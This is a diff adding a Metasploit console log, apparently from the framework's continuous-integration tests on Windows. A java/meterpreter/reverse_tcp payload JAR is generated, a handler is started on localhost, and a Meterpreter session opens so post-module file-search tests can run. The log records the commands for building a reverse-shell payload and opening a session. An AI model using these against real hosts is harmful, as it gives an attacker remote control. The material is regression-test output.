@@ -1,0 +1,43 @@
+use java/meterpreter/reverse_tcp
+msf6 post(test/file) > irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:D:/a/_temp/javameterpreterreverse_tcp_session_tlv_logging20231026-3620-ara3uytxt
+msf6 payload(java/meterpreter/reverse_tcp) > msf6 payload(java/meterpreter/reverse_tcp) > SessionTlvLogging => file:D:/a/_temp/javameterpreterreverse_tcp_session_tlv_logging20231026-3620-ara3uytxt
+msf6 payload(java/meterpreter/reverse_tcp) > generate -o D:/a/_temp/child-process-rb-java-meterpreter-reverse-tcp20231026-3620-d51z93.jar -f jar AutoVerifySessionTimeout=30 lport=6002 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:D:/a/_temp/javameterpreterreverse_tcp_debug_log20231026-3620-z3orpatxt spawn=0
+[*] Writing 5259 bytes to D:/a/_temp/child-process-rb-java-meterpreter-reverse-tcp20231026-3620-d51z93.jar...
+msf6 payload(java/meterpreter/reverse_tcp) > to_handler
+[*] Payload Handler Started as Job 1
+msf6 payload(java/meterpreter/reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6002 
+[*] Sending stage (57692 bytes) to 127.0.0.1
+[*] Meterpreter session 2 opened (127.0.0.1:6002 -> 127.0.0.1:50106) at 2023-10-26 19:05:25 +0000
+use test/search
+msf6 post(test/search) > run session=2 AddEntropy=true Verbose=true
+[*] Setup: changing working directory to tmp: C:\Users\RUNNER~1\AppData\Local\Temp
+[*] Setup: Creating clean directory
+[*] Creating directory meterpreter-test-dir-xgkqcjpd
+[*] meterpreter-test-dir-xgkqcjpd created
+[*] Setup: Now in C:\Users\runneradmin\AppData\Local\Temp\meterpreter-test-dir-xgkqcjpd
+[*] Source File Name: meterpreter-test-eaqgduom.txt
+[*] Running against session 2
+[*] Session type is meterpreter and platform is windows
+[*] Starting search date tests
+[+] should search with dates for files
+[+] should search with dates ignores new files
+[+] should search with dates ignores old files
+[*] Session does not support setting the modified date, skipping exact date tests
+[*] Starting search tests
+[+] should search for new files
+[+] should search recursively for files
+[+] should search with globs for files
+[+] should search with globs ignoring files
+[*] Testing complete in 0.15 seconds
+[*] Passed: 7; Failed: 0; Skipped: 0
+[*] Cleanup: changing working directory back to D:\a\metasploit-framework\metasploit-framework
+[*] Post module execution completed
+msf6 post(test/search) > sessions -K
+jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 2 closed.
+msf6 post(test/search) > Stopping all jobs...
+msf6 post(test/search) > 
